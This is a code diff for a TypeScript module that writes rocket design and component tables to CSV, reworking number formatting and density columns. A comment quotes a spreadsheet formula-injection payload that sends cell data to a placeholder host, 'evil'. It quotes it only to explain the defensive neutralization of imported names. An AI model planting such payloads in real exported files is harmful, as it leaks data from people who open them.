@@ -1,12 +1,14 @@
 import type { StaticInfo } from '../../engine/openRocketEngine';
-import type { ReportModel } from './reportModel';
+import type { MaterialDensity, ReportModel } from './reportModel';
 import { exportFilename, saveText } from '../files/saveFile';
-import { fmtSi, type UnitSelection } from '../../prefs/units';
+import { siToUi, type Quantity, type UnitSelection } from '../../prefs/units';
 import { plainDecimal } from '../files/numberText';
-import { staticInfoRows } from './designInfo';
+import { sig4, staticInfoRows } from './designInfo';
 import { type StatKey } from './designInfo';
-import { neutralizeFormula } from '../exports/csvCell';
+import { csvField } from '../exports/csvCell';
 import { CSV_MIME } from '../exports/csvExport';
+import i18n from '../../i18n';
+import { partLabel } from '../../i18n/format';
 
 /**
  * Design-info CSV export: the same Scope / Field / Value / Unit layout
@@ -21,28 +23,42 @@ import { CSV_MIME } from '../exports/csvExport';
 const round = (v: number, d: number): string => plainDecimal(v, d);
 
 /**
- * RFC-4180 cell, with spreadsheet formula injection neutralized.
+ * An SI figure in the chosen unit, to six significant figures. A fixed count of
+ * decimals is wrong in one unit or another: three decimals write a 0.5 mm wall
+ * in meters as 0.001. A figure the kernel could not give is a blank cell, as in
+ * every CSV the app writes, never the UI's no-value glyph in a numeric column.
+ */
+const fig = (q: Quantity, symbol: string, si: number): string => {
+  if (!Number.isFinite(si)) return '';
+  const v = Number(siToUi(q, symbol, si).toPrecision(6));
+  // Plain decimal, never an exponent, which a spreadsheet may read as text:
+  // `String` writes one below 1e-6.
+  const s = v.toFixed(12).replace(/\.?0+$/, '');
+  return s === '-0' ? '0' : s;
+};
+
+/**
+ * RFC-4180 cell, with spreadsheet formula injection neutralized by the rule
+ * every CSV writer shares (`csvField`).
  *
  * Values here are file-sourced: `model.name` is the `<name>` of an imported
- * `.ork` and the fin-set labels are its node names. A rocket named
- * `=HYPERLINK("http://evil/?"&A1,"Open")` would otherwise execute when the
- * exported CSV is opened in Excel or Sheets, so a leading formula trigger gets
- * a `'` in front of it. Same rule as `flightPathExport.ts`.
+ * `.ork` and the fin-set and part labels are its node names. A rocket named
+ * `=HYPERLINK("http://evil/?"&A1,"Open")`, or `x;=HYPERLINK(...)` read in a
+ * locale that splits on `;`, would otherwise execute when the exported CSV is
+ * opened in Excel or Sheets. Figures go through the same function and stay
+ * numeric, negatives included.
  *
  * A lone `\r` is quoted too: the file's own terminator is `\r\n`, so an
  * unquoted bare CR inside a name splits the record for RFC-4180 readers.
  */
-const cell = (s: string): string => {
-  const safe = neutralizeFormula(s);
-  return /[",\r\n]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
-};
+const cell = (s: string): string => csvField(s);
 
 /** [field, value, unit] rows for one summary, in the user's units. */
 function summaryRows(info: StaticInfo, units: UnitSelection): [string, string, string][] {
-  // `fmtSi`, not the locale-aware formatter: this is a data file, and its
+  // `fig`, not the locale-aware formatter: this is a data file, and its
   // decimal separator must not move with the UI language.
-  const len = (si: number): [string, string] => [fmtSi('length', units.length, si, 3), units.length];
-  const mass = (si: number): [string, string] => [fmtSi('mass', units.mass, si, 3), units.mass];
+  const len = (si: number): [string, string] => [fig('length', units.length, si), units.length];
+  const mass = (si: number): [string, string] => [fig('mass', units.mass, si), units.mass];
   const cellFor = (key: StatKey, v: number): [string, string] => {
     switch (key) {
       case 'massEmpty':
@@ -60,7 +76,9 @@ function summaryRows(info: StaticInfo, units: UnitSelection): [string, string, s
         return [round(v, 2), '/rad'];
       case 'pitchInertia':
       case 'rollInertia':
-        return [round(v, 6), 'kg·m²'];
+        // Significant figures, not fixed decimals: a small rocket's roll inertia
+        // is around 1e-7 kg·m², which six decimals would write as 0.
+        return [Number.isFinite(v) ? sig4(v) : '', 'kg·m²'];
       default:
         return len(v);
     }
@@ -105,14 +123,19 @@ export function buildDesignCsv(model: ReportModel, units: UnitSelection): string
 
   for (const st of model.finSetsByStage) {
     for (const s of st.sets) {
-      const label = st.sets.length > 1 ? `${s.name}: ` : 'Fin set: ';
-      push(st.stage, `${label}Nose to top of fin root`, fmtSi('length', units.length, s.topX, 3), units.length);
-      push(st.stage, `${label}Nose to bottom of fin root`, fmtSi('length', units.length, s.bottomX, 3), units.length);
+      // The field stays an English identifier; the part's name in it is the
+      // part's own, or its type's name for an unnamed one.
+      const label = st.sets.length > 1 ? `${partLabel(i18n.t, s)}: ` : 'Fin set: ';
+      push(st.stage, `${label}Nose to top of fin root`, fig('length', units.length, s.topX), units.length);
+      push(st.stage, `${label}Nose to bottom of fin root`, fig('length', units.length, s.bottomX), units.length);
     }
   }
 
   return lines.join('\r\n') + '\r\n';
 }
+
+/** The component table's density columns, in order: bulk, surface, line. */
+const DENSITY_KINDS: readonly MaterialDensity[] = ['density', 'surfaceDensity', 'lineDensity'];
 
 /**
  * The component table: one row per part, stage by stage in tree order, with the
@@ -136,6 +159,8 @@ export function buildComponentCsv(
       'Name',
       'Material',
       `Density (${units.density})`,
+      `Surface density (${units.surfaceDensity})`,
+      `Line density (${units.lineDensity})`,
       `Length (${units.length})`,
       `Outer diameter (${units.length})`,
       `Inner diameter (${units.length})`,
@@ -145,7 +170,7 @@ export function buildComponentCsv(
       `Mass (${units.mass})`,
     ].join(','),
   ];
-  const len = (m: number | undefined) => (m == null ? '' : fmtSi('length', units.length, m, 3));
+  const len = (m: number | undefined) => (m == null ? '' : fig('length', units.length, m));
   const dia = (r: number | undefined) => (r == null ? '' : len(2 * r));
   for (const st of model.partsByStage) {
     for (const p of st.rows) {
@@ -156,14 +181,17 @@ export function buildComponentCsv(
           cell(partName(p.type)),
           cell(p.name),
           cell(p.material ?? ''),
-          p.density == null ? '' : fmtSi('density', units.density, p.density, 3),
+          // One column per kind of density, so each column has one unit.
+          ...DENSITY_KINDS.map((k) =>
+            p.density == null || (p.densityKind ?? 'density') !== k ? '' : fig(k, units[k], p.density),
+          ),
           len(p.length),
           dia(p.outerR),
           dia(p.innerR),
           dia(p.foreR),
           dia(p.aftR),
           len(p.thickness),
-          fmtSi('mass', units.mass, p.mass, 3),
+          fig('mass', units.mass, p.mass),
         ].join(','),
       );
     }
